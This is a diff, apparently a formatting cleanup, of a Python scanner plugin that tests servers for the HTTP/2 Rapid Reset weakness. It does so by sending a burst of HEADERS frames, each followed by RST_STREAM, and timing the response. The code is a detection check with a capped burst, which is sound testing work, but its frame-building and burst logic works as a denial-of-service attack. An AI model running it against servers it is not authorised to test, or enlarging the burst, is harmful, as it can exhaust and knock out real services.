@@ -7,12 +7,12 @@ Detects vulnerability by sending massive concurrent HEADERS frames followed
 instantly by RST_STREAM frames, monitoring for connection drops or severe latency.
 """
 
+import logging
 import socket
 import ssl
 import struct
 import time
-import logging
-from typing import Optional, Dict, Any
+from typing import Any
 
 logger = logging.getLogger("Cascavel.Plugins.HTTP2RapidReset")
 
@@ -23,12 +23,14 @@ FRAME_HEADERS = 0x01
 FRAME_RST_STREAM = 0x03
 FLAG_END_HEADERS = 0x04
 
+
 def build_frame(length: int, ftype: int, flags: int, stream_id: int, payload: bytes = b"") -> bytes:
     """Builds an HTTP/2 frame."""
-    header = struct.pack(">I", (length << 8) | ftype)[1:] # 24-bit length + 8-bit type
+    header = struct.pack(">I", (length << 8) | ftype)[1:]  # 24-bit length + 8-bit type
     header += struct.pack(">B", flags)
     header += struct.pack(">I", stream_id & 0x7FFFFFFF)
     return header + payload
+
 
 def check_rapid_reset(target: str, ip: str, port: int) -> tuple[bool, str]:
     """
@@ -39,14 +41,14 @@ def check_rapid_reset(target: str, ip: str, port: int) -> tuple[bool, str]:
     context = ssl.create_default_context()
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
-    context.set_alpn_protocols(['h2'])
+    context.set_alpn_protocols(["h2"])
 
     try:
         sock = socket.create_connection((ip, port), timeout=5)
         ssock = context.wrap_socket(sock, server_hostname=target)
-        
-        if ssock.selected_alpn_protocol() != 'h2':
-             return False, "Server does not negotiate HTTP/2 via ALPN."
+
+        if ssock.selected_alpn_protocol() != "h2":
+            return False, "Server does not negotiate HTTP/2 via ALPN."
 
         # 2. Send Magic Preface
         ssock.sendall(PRIZM_PREFACE)
@@ -56,69 +58,72 @@ def check_rapid_reset(target: str, ip: str, port: int) -> tuple[bool, str]:
         ssock.sendall(settings_frame)
 
         # 4. Rapid Reset Attack
-        # We send a burst of HEADERS frames to open streams, 
+        # We send a burst of HEADERS frames to open streams,
         # and immediately send RST_STREAM to close them.
         # Vulnerable servers will allocate resources for the stream upon HEADERS
         # but fail to release them quickly enough upon RST_STREAM, leading to exhaustion.
-        
+
         # A minimal HPACK encoded header block:
         # :method: GET, :path: /, :scheme: https, :authority: target
         # For simplicity in this micro-test, we use a static, partially valid block
         # just enough to trigger the stream allocation.
-        dummy_hpack = b"\x82\x84\x86\x87" # Indexed headers for method, path, scheme
-        
-        burst_size = 150 # Enough to test limits without causing a massive DoS
+        dummy_hpack = b"\x82\x84\x86\x87"  # Indexed headers for method, path, scheme
+
+        burst_size = 150  # Enough to test limits without causing a massive DoS
         stream_id = 1
-        
+
         start_time = time.time()
-        
+
         payload = bytearray()
         for _ in range(burst_size):
             # Open Stream
             payload.extend(build_frame(len(dummy_hpack), FRAME_HEADERS, FLAG_END_HEADERS, stream_id, dummy_hpack))
             # Immediately Reset Stream
             # Error code 8 = CANCEL
-            rst_payload = struct.pack(">I", 8) 
+            rst_payload = struct.pack(">I", 8)
             payload.extend(build_frame(4, FRAME_RST_STREAM, 0x00, stream_id, rst_payload))
-            
-            stream_id += 2 # Client stream IDs must be odd
-            
+
+            stream_id += 2  # Client stream IDs must be odd
+
         ssock.sendall(payload)
-        
+
         # 5. Measure Server Response
-        # Vulnerable servers will either drop the connection (TCP RST) 
+        # Vulnerable servers will either drop the connection (TCP RST)
         # or take significantly longer to respond to subsequent ping/data frames
         # because their event loops are overwhelmed by the cancellation queue.
-        
+
         # Send a final benign frame and see if it responds in time
         ping_payload = b"PINGPONG"
-        ping_frame = build_frame(8, 0x06, 0x00, 0, ping_payload) # PING frame
+        ping_frame = build_frame(8, 0x06, 0x00, 0, ping_payload)  # PING frame
         ssock.sendall(ping_frame)
-        
+
         # Wait for response
         resp = ssock.recv(1024)
         elapsed = time.time() - start_time
-        
+
         if not resp:
-             return True, "Connection dropped abruptly after Rapid Reset burst. Server is likely vulnerable."
-             
-        if elapsed > 3.0: # High latency indicates resource exhaustion
-             return True, f"Server exhibited severe latency ({elapsed:.2f}s) recovering from Rapid Reset burst."
+            return True, "Connection dropped abruptly after Rapid Reset burst. Server is likely vulnerable."
+
+        if elapsed > 3.0:  # High latency indicates resource exhaustion
+            return True, f"Server exhibited severe latency ({elapsed:.2f}s) recovering from Rapid Reset burst."
 
         return False, ""
 
-    except (socket.timeout, ConnectionResetError, BrokenPipeError):
-         # If it crashes or resets during the burst, it's vulnerable.
-         return True, "Connection reset or timed out during the attack burst, indicating resource exhaustion."
+    except (TimeoutError, ConnectionResetError, BrokenPipeError):
+        # If it crashes or resets during the burst, it's vulnerable.
+        return True, "Connection reset or timed out during the attack burst, indicating resource exhaustion."
     except Exception as e:
-         logger.debug(f"Rapid Reset check failed on {target}: {e}")
-         return False, ""
+        logger.debug(f"Rapid Reset check failed on {target}: {e}")
+        return False, ""
     finally:
         try:
-             if 'ssock' in locals(): ssock.close()
-        except: pass
+            if "ssock" in locals():
+                ssock.close()
+        except Exception:
+            pass
 
-def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, Any]]:
+
+def run(target: str, ip: str, ports: list, banners: dict) -> dict[str, Any] | None:
     """
     Checks for HTTP/2 Rapid Reset & HPACK Bombing.
     """
@@ -144,7 +149,7 @@ def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, 
             "severity": severity,
             "description": description,
             "endpoint": f"https://{target}:443",
-            "evidence": evidence
+            "evidence": evidence,
         }
 
     return None
